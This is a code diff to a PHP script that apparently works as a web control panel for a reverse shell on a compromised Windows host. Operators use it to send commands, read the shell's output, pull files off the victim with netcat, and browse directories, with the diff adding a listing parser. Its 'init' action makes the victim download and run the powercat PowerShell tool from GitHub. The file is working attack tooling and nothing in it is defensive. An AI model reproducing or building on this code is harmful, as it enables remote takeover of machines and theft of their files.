@@ -4,6 +4,53 @@ $fileTransferPort = 4243;
 $outputfile = "../reverseresult";
 $powercatFolder = ".";
 
+class File
+{
+    public $mode;
+    public $lastModifiedDay;
+    public $lastModifiedTime;
+    public $size = 0;
+    public $name = "";
+}
+
+class DirectoryData
+{
+    public $directory = ".";
+    public $files= array();
+    
+    public function initFromReverseResult($result) {
+        $resAsArray = explode("\n", $result);
+        $lines = array();
+        foreach($resAsArray as $line){
+            if (($line[0] == 'd') || (($line[0] == '-') && (substr($line, -1) != '-'))){
+                // echo $line;
+                // echo "\n";
+                $attributes = explode(" ", preg_replace('/\s+/', ' ', $line));
+                // echo count($attributes);
+                $lineAsObject = new File;
+                $lineAsObject->mode = $attributes[0];
+                $lineAsObject->lastModifiedDay = $attributes[1];
+                $lineAsObject->lastModifiedTime = $attributes[2];
+                if ($line[0] == 'd'){
+                    for ($i = 3; $i < count($attributes); $i++){
+                        $lineAsObject->name .= ($i == 3 ? "" : " ") . $attributes[$i];
+                    }
+                } else {
+                    $lineAsObject->size = $attributes[3];
+                    for ($i = 4; $i < count($attributes); $i++){
+                        $lineAsObject->name .= ($i == 4 ? "" : " ") . $attributes[$i];
+                    }
+                }
+                $lines[] = $lineAsObject;
+            }
+            if (strpos($line, 'Directory') !== false) {
+                $this->directory = trim(str_replace('Directory:', '', $line));
+            }
+        }
+        $this->files = $lines;
+    }
+}
+
 function writeToReverseShell($cmd, $outputfile, $maxsleep){
     $newfile = $outputfile . "-old";
     if (!copy($outputfile, $newfile)) {
@@ -46,11 +93,13 @@ if (isset($_POST['action'])) {
         case "logs":
             echo file_get_contents($outputfile);
         break;
+        
         case "write":
             if (isset($_POST['command']) && strcmp($_POST['command'], "") != 0) {
                 echo writeToReverseShell($_POST['command'], $outputfile, $maxsleep);
             }
         break;
+        
         case "download":
             session_write_close();
             shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/test.pdf &");
@@ -62,11 +111,23 @@ if (isset($_POST['action'])) {
             fclose($handle);  
             // echo "saving file";
         break;
+        
         case "init":
             $cmd = '(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1", "./powercat.ps1"); . ./powercat.ps1';
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
             $powercatFolder = substr($result, 0, -2);
             echo $result;
+        break;
+        case "list":
+            $cmd = "Get-ChildItem -Force";
+            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
+            $jsonData = new DirectoryData;
+            $jsonData->initFromReverseResult($result);
+            echo json_encode($jsonData);
+        break;
+
+        default:
+        break;
     }
 }
 ?>
